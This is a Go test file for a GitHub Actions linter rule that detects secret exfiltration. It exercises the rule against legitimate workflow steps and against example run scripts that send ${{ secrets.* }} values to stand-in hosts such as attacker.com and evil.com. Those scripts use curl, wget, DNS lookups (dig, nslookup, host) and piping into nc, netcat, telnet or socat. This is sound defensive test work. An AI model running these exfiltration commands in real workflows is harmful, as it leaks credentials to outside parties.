package core

import (
	"strings"
	"testing"

	"github.com/sisaku-security/sisakulint/pkg/ast"
)

func TestNewSecretExfiltrationRule(t *testing.T) {
	rule := NewSecretExfiltrationRule()
	if rule.RuleName != "secret-exfiltration" {
		t.Errorf("RuleName = %q, want %q", rule.RuleName, "secret-exfiltration")
	}
	if !strings.Contains(rule.RuleDesc, "exfiltrated") {
		t.Errorf("RuleDesc should contain 'exfiltrated', got %q", rule.RuleDesc)
	}
}

func TestSecretExfiltration_CurlWithSecret(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "curl with direct secret in -d flag",
			runScript:   `curl -X POST https://attacker.com -d "token=${{ secrets.API_TOKEN }}"`,
			wantErrors:  1,
			description: "Should detect curl with secret in data flag",
		},
		{
			name:        "curl with secret in --data flag",
			runScript:   `curl --data "key=${{ secrets.SECRET_KEY }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in --data flag",
		},
		{
			name:        "curl with secret in -H flag",
			runScript:   `curl -H "Authorization: Bearer ${{ secrets.TOKEN }}" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in header",
		},
		{
			name:        "curl POST to github api (legitimate)",
			runScript:   `curl -X POST https://api.github.com/repos/owner/repo/issues -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}"`,
			wantErrors:  0,
			description: "Should NOT detect curl to GitHub API (legitimate)",
		},
		{
			name:        "curl to npm registry (legitimate)",
			runScript:   `curl -H "Authorization: Bearer ${{ secrets.NPM_TOKEN }}" https://registry.npmjs.org`,
			wantErrors:  0,
			description: "Should NOT detect curl to NPM registry (legitimate)",
		},
		{
			name:        "curl without secret",
			runScript:   `curl -X GET https://api.example.com/status`,
			wantErrors:  0,
			description: "Should NOT detect curl without secrets",
		},
		{
			name: "curl with secret in multiline script - same line",
			runScript: `#!/bin/bash
curl -X POST https://attacker.com/exfil -d "secret=${{ secrets.API_KEY }}"`,
			wantErrors:  1,
			description: "Should detect curl with secret on same line",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_WgetWithSecret(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "wget with --post-data and secret",
			runScript:   `wget --post-data "token=${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect wget with secret in post-data",
		},
		{
			name:        "wget with --header and secret",
			runScript:   `wget --header "Authorization: ${{ secrets.AUTH_TOKEN }}" https://attacker.com`,
			wantErrors:  1,
			description: "Should detect wget with secret in header",
		},
		{
			name:        "wget from github (legitimate)",
			runScript:   `wget https://github.com/owner/repo/releases/download/v1.0/file.tar.gz`,
			wantErrors:  0,
			description: "Should NOT detect wget from GitHub without secrets",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_DNSExfiltration(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "dig with secret in query",
			runScript:   `dig ${{ secrets.API_KEY }}.attacker.com`,
			wantErrors:  1,
			description: "Should detect dig used for DNS exfiltration",
		},
		{
			name:        "nslookup with secret",
			runScript:   `nslookup ${{ secrets.TOKEN }}.evil.com`,
			wantErrors:  1,
			description: "Should detect nslookup used for DNS exfiltration",
		},
		{
			name:        "host with secret",
			runScript:   `host ${{ secrets.SECRET }}.attacker.com`,
			wantErrors:  1,
			description: "Should detect host used for DNS exfiltration",
		},
		{
			name:        "dig without secret",
			runScript:   `dig example.com`,
			wantErrors:  0,
			description: "Should NOT detect dig without secrets",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_NetcatExfiltration(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "nc with secret",
			runScript:   `echo "${{ secrets.TOKEN }}" | nc attacker.com 443`,
			wantErrors:  1,
			description: "Should detect nc with piped secret",
		},
		{
			name:        "netcat with secret",
			runScript:   `echo "${{ secrets.API_KEY }}" | netcat evil.com 80`,
			wantErrors:  1,
			description: "Should detect netcat with piped secret",
		},
		{
			name:        "telnet with secret",
			runScript:   `echo "${{ secrets.PASSWORD }}" | telnet attacker.com 23`,
			wantErrors:  1,
			description: "Should detect telnet with piped secret",
		},
		{
			name:        "socat with secret",
			runScript:   `echo "${{ secrets.SECRET }}" | socat - TCP:evil.com:443`,
			wantErrors:  1,
			description: "Should detect socat with piped secret",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_EnvVarLeak(t *testing.T) {
	tests := []struct {
		name        string
		envVars     map[string]*ast.EnvVar
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name: "curl with secret in env var",
			envVars: map[string]*ast.EnvVar{
				"my_token": {
					Name: &ast.String{Value: "MY_TOKEN"},
					Value: &ast.String{
						Value: "${{ secrets.API_TOKEN }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -X POST https://attacker.com -d "token=$MY_TOKEN"`,
			wantErrors:  1,
			description: "Should detect curl with secret passed via env var",
		},
		{
			name: "curl with secret in env var using ${} syntax",
			envVars: map[string]*ast.EnvVar{
				"secret_key": {
					Name: &ast.String{Value: "SECRET_KEY"},
					Value: &ast.String{
						Value: "${{ secrets.KEY }}",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -d "${SECRET_KEY}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl with secret in ${} syntax",
		},
		{
			name: "env var without secret",
			envVars: map[string]*ast.EnvVar{
				"normal_var": {
					Name: &ast.String{Value: "NORMAL_VAR"},
					Value: &ast.String{
						Value: "some-value",
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			},
			runScript:   `curl -d "$NORMAL_VAR" https://example.com`,
			wantErrors:  0,
			description: "Should NOT detect env var without secret",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Env: &ast.Env{
					Vars: tt.envVars,
				},
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_LegitimatePatterns(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "npm publish with token",
			runScript:   `npm publish --access public`,
			wantErrors:  0,
			description: "npm publish is legitimate",
		},
		{
			name:        "docker login",
			runScript:   `docker login -u ${{ github.actor }} -p ${{ secrets.GITHUB_TOKEN }} ghcr.io`,
			wantErrors:  0,
			description: "docker login is legitimate",
		},
		{
			name:        "docker push",
			runScript:   `docker push ghcr.io/owner/image:latest`,
			wantErrors:  0,
			description: "docker push is legitimate",
		},
		{
			name:        "twine upload",
			runScript:   `twine upload dist/*`,
			wantErrors:  0,
			description: "twine upload is legitimate",
		},
		{
			name:        "gem push",
			runScript:   `gem push *.gem`,
			wantErrors:  0,
			description: "gem push is legitimate",
		},
		{
			name:        "cargo publish",
			runScript:   `cargo publish`,
			wantErrors:  0,
			description: "cargo publish is legitimate",
		},
		{
			name:        "aws configure",
			runScript:   `aws configure set aws_access_key_id ${{ secrets.AWS_ACCESS_KEY }}`,
			wantErrors:  0,
			description: "aws configure is legitimate",
		},
		{
			name:        "gcloud auth",
			runScript:   `gcloud auth activate-service-account --key-file key.json`,
			wantErrors:  0,
			description: "gcloud auth is legitimate",
		},
		{
			name:        "terraform login",
			runScript:   `terraform login`,
			wantErrors:  0,
			description: "terraform login is legitimate",
		},
		{
			name:        "gh api call",
			runScript:   `gh api repos/owner/repo/issues`,
			wantErrors:  0,
			description: "gh cli is legitimate",
		},
		{
			name:        "git push",
			runScript:   `git push origin main`,
			wantErrors:  0,
			description: "git push is legitimate",
		},
		{
			name:        "codecov upload",
			runScript:   `codecov -t ${{ secrets.CODECOV_TOKEN }}`,
			wantErrors:  0,
			description: "codecov is legitimate",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_ErrorMessages(t *testing.T) {
	tests := []struct {
		name           string
		runScript      string
		expectedSubstr string
		description    string
	}{
		{
			name:           "critical severity message",
			runScript:      `curl -X POST https://attacker.com -d "token=${{ secrets.API_TOKEN }}"`,
			expectedSubstr: "critical",
			description:    "Should have critical severity for curl POST with secret",
		},
		{
			name:           "env var leak message",
			runScript:      `curl -d "$MY_TOKEN" https://evil.com`,
			expectedSubstr: "environment variable",
			description:    "Should mention environment variable in error",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			var envVars map[string]*ast.EnvVar
			if strings.Contains(tt.runScript, "$MY_TOKEN") {
				envVars = map[string]*ast.EnvVar{
					"my_token": {
						Name: &ast.String{Value: "MY_TOKEN"},
						Value: &ast.String{
							Value: "${{ secrets.TOKEN }}",
							Pos:   &ast.Position{Line: 1, Col: 1},
						},
					},
				}
			}

			step := &ast.Step{
				Env: &ast.Env{
					Vars: envVars,
				},
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			errors := rule.Errors()
			if len(errors) == 0 {
				t.Fatalf("%s: Expected at least one error", tt.description)
			}

			found := false
			for _, err := range errors {
				if strings.Contains(err.Description, tt.expectedSubstr) {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("%s: Expected error message to contain %q, got %v",
					tt.description, tt.expectedSubstr, errors)
			}
		})
	}
}

func TestSecretExfiltration_MultipleSecrets(t *testing.T) {
	rule := NewSecretExfiltrationRule()

	step := &ast.Step{
		Exec: &ast.ExecRun{
			Run: &ast.String{
				Value: `curl -X POST https://evil.com -d "token=${{ secrets.TOKEN1 }}" -H "Auth: ${{ secrets.TOKEN2 }}"`,
				Pos:   &ast.Position{Line: 1, Col: 1},
			},
		},
	}

	job := &ast.Job{Steps: []*ast.Step{step}}
	_ = rule.VisitJobPre(job)

	gotErrors := len(rule.Errors())
	if gotErrors != 2 {
		t.Errorf("Expected 2 errors for multiple secrets, got %d. Errors: %v",
			gotErrors, rule.Errors())
	}
}

func TestSecretExfiltration_CommandInSubshell(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "curl in subshell",
			runScript:   `$(curl -d "${{ secrets.TOKEN }}" https://evil.com)`,
			wantErrors:  1,
			description: "Should detect curl in subshell",
		},
		{
			name:        "curl with backticks",
			runScript:   "`curl -d \"${{ secrets.TOKEN }}\" https://evil.com`",
			wantErrors:  1,
			description: "Should detect curl with backticks",
		},
		{
			name:        "curl after && operator",
			runScript:   `echo "test" && curl -d "${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl after && operator",
		},
		{
			name:        "curl after ; semicolon",
			runScript:   `echo "test"; curl -d "${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  1,
			description: "Should detect curl after semicolon",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_CurlToKnownGoodDomains(t *testing.T) {
	goodDomains := []string{
		"https://api.github.com/repos/owner/repo/releases",
		"https://codecov.io/upload/v2",
		"https://api.slack.com/api/chat.postMessage",
		"https://hooks.slack.com/services/xxx/yyy",
		"https://discord.com/api/webhooks/xxx",
		"https://api.telegram.org/botXXX/sendMessage",
		"https://sentry.io/api/xxx/store/",
		"https://datadoghq.com/api/v1/events",
		"https://api.snyk.io/v1/monitor",
		"https://sonarcloud.io/api/project_analyses/search",
	}

	for _, domain := range goodDomains {
		t.Run(domain, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: `curl -X POST ` + domain + ` -H "Authorization: ${{ secrets.TOKEN }}"`,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != 0 {
				t.Errorf("Should NOT detect curl to known good domain %s, got %d errors: %v",
					domain, gotErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_EdgeCases(t *testing.T) {
	tests := []struct {
		name        string
		runScript   string
		wantErrors  int
		description string
	}{
		{
			name:        "empty script",
			runScript:   ``,
			wantErrors:  0,
			description: "Should handle empty script",
		},
		{
			name:        "comment only",
			runScript:   `# curl -d "${{ secrets.TOKEN }}" https://evil.com`,
			wantErrors:  0,
			description: "Should NOT detect commands in comments (false positive acceptable)",
		},
		{
			name:        "curl command without URL",
			runScript:   `CURL_CMD="curl"`,
			wantErrors:  0,
			description: "Should NOT detect curl as variable value",
		},
		{
			name:        "secret in echo but not in curl - false positive accepted",
			runScript:   `echo "${{ secrets.TOKEN }}" && curl https://example.com`,
			wantErrors:  1,
			description: "False positive: secret and curl on same line but secret not passed to curl (limitation of line-based analysis)",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := NewSecretExfiltrationRule()

			step := &ast.Step{
				Exec: &ast.ExecRun{
					Run: &ast.String{
						Value: tt.runScript,
						Pos:   &ast.Position{Line: 1, Col: 1},
					},
				},
			}

			job := &ast.Job{Steps: []*ast.Step{step}}
			_ = rule.VisitJobPre(job)

			gotErrors := len(rule.Errors())
			if gotErrors != tt.wantErrors {
				t.Errorf("%s: got %d errors, want %d errors. Errors: %v",
					tt.description, gotErrors, tt.wantErrors, rule.Errors())
			}
		})
	}
}

func TestSecretExfiltration_ExtractSecretRef(t *testing.T) {
	rule := NewSecretExfiltrationRule()

	tests := []struct {
		input    string
		expected string
	}{
		{"${{ secrets.MY_TOKEN }}", "secrets.MY_TOKEN"},
		{"${{ secrets.API_KEY }}", "secrets.API_KEY"},
		{"${{secrets.TOKEN}}", "secrets.TOKEN"},
		{"${{  secrets.KEY  }}", "secrets.KEY"},
		{"some text", ""},
		{"${{ github.token }}", ""},
	}

	for _, tt := range tests {
		got := rule.extractSecretRef(tt.input)
		if got != tt.expected {
			t.Errorf("extractSecretRef(%q) = %q, want %q", tt.input, got, tt.expected)
		}
	}
}

func TestSecretExfiltration_LineContainsCommand(t *testing.T) {
	rule := NewSecretExfiltrationRule()

	tests := []struct {
		line     string
		cmd      string
		expected bool
	}{
		{"curl https://example.com", "curl", true},
		{"  curl https://example.com", "curl", true},
		{"$(curl https://example.com)", "curl", true},
		{"`curl https://example.com`", "curl", true},
		{"echo test && curl https://example.com", "curl", true},
		{"echo test; curl https://example.com", "curl", true},
		{"CURL=value", "curl", false},
		{"mycurl https://example.com", "curl", false},
		{"echo curl", "curl", true}, // This is a false positive but acceptable
	}

	for _, tt := range tests {
		got := rule.lineContainsCommand(tt.line, tt.cmd)
		if got != tt.expected {
			t.Errorf("lineContainsCommand(%q, %q) = %v, want %v", tt.line, tt.cmd, got, tt.expected)
		}
	}
}
